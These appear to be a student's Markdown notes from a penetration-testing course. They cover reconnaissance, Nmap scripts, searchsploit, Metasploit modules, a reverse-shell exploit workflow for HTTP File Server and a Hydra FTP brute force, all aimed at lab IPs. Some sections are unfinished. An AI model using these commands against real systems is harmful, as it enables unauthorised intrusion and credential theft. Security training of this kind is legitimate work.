# Exploitation
- What is exploitation: consists of techniques and tools used by penetration testers/adveseries to gain an initial foothold on a target system or network
- Succesful Exploitation Will heavily depend on the nature and quality of *information gathering* and *service enumeration* performed on the target
## Penetration Testing Phases
1. Information Gathering
2. Enumeration
3. Exploitation
4. Post Exploitation
   1. Privelege Escalation
   2. Maintain Persistant Access
   3. Clearing Tracks
### Banner grabbing and SSH Recon
- Banner grabbing is an information gathering technique used to enumerate information regarding the target operationg system as well as services that are running on its open ports
- search service version with metasploit: `searchsploit service version` look for version
  
1. cool nmap banner grapping script: `ls -al /usr/share/nmap/scripts/ | grep banner` -> `nmap -sV --script=banner 10.10.x.x` 
2. Netcat: `nc 10.10.x.x 22` <-- port also

### Nmap scripting engine- vulnscanning

- `ls -al /usr/share/nmap/scripts/ | grep search_word`
- Shellshock: `nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/scriptypufound.cgi" 10.10.x.x`

### Search for public Exploits
- Exploit db: vsftpd 2.3.4
- Rapid7

### Lab: HTTP File Server
1. scan: nmap
2. searchsploit: `searchsploit HTTP File Server 2.3`
3. copy to desktop: `searchsploit -m 39161`
4. vim(change exploit, IP, PORT): `vim 39161`
5. start pyhton server: `python -m SimpleHTTPServer 80`
6.  copy netcat:  `cp /usr/share/windows-resources/binaries/nc.exe .`
7. netcat: `nc -nvlp 443`
8. lunch script: `python39161.py 10.10.x.x 80`
9. get flag

### Cross compiling
  ...


### Netcat
- Netcat be used to: Banner grabbing, Port Scanning, Transferring Files, Bind/Reverse shells

### Reverse Shells
- revshells.com
- 
### Lab: Windows: File and Keylogging
1. `nmap -sV 10.10.x.x`
2. `searchsploit badblue 2.7`
3. `msfconsole` -> `use exploit/windows/http/badblue_passthru` --> `set RHOSTS 10.0.0.71` --> run
4. `shell`
5. search flag

### MSF Exploitation
![alt text](/assets/penetration_testing_with_MSF.png)

### Lab: Windows - Workflow platform
1. scan
2. check credentials online for proccess maker
3. `searchsploit ProcessMaker` 
4. launch msfconsole
5. create workspace: workspace -a nameofworkspace
6. `search processmaker`
7. use 0
8. set RHOSTS 10.10.x.x -> run
9. get flag

### Lab: Windows Black Box Penetration test: Exploitation
**Host Discovery**
   1. target `cat /etc/hosts`
   2. ping target
   3. and create file info
**Port Scanning & Enumeration**
*TCP*
   1. `nmap -sV 10.10.x.x`
   2. `nmap -T4 -PA -sV -sC -p 1-10000 10.10.x.x -oX nmap_10k`
   3. `service postgresql start && msfconsole`
   4. in msf: `workspace -a Win258`
   5. import file output: `db_import root/Desktop/wind2k8/nmap_10k`
   6. commands: `hosts`, `services`, set os_name etc -> `search smb_version` --> use 0 --> set RHOSTS -> run
*UDP SCAN*
- `nmap -sU -sV 10.10.x.x`
**Vulnerability detection/scanning**
*Targeting Microsoft IIS FTP*
  1. s
**Exploitation**
*Manual*
### Exploiting FTP
- FTP port 21, file sharing
- Can be anonymous access: check: `nmap -sV 10.10.x.x --script=ftp-anon`
- can be a brute force attack
- Search for version vuln: `searchsploit versionOfFTP`
1. After FTP found: try anonymous `ftp 10.10.x.x 21` 
2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* ` -> run nmap script: `nmap -sV 10.10.x.x --script=ftp-anon`
3. Hydra bruteforce: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 ftp`
4. login: `ftp 10.10.x.x` --> fill in username and password --> to download / show file `get secret.txt`


6. check version: `searchsploit FTP version`
7. check for anonymous: `nmap -sV 10.10.x.x --script=ftp-anon`

*Automated*
**Post Exploitation**
*Privelege Escalation*
*Persistence*
*Dumping Hashes*


### Linux Black box penetration test
1. nmap -sV 10.10.x.x
2. nmap -sV -sC -O -p 1-1000 10.10.x.x -oX nmap_10k
3. 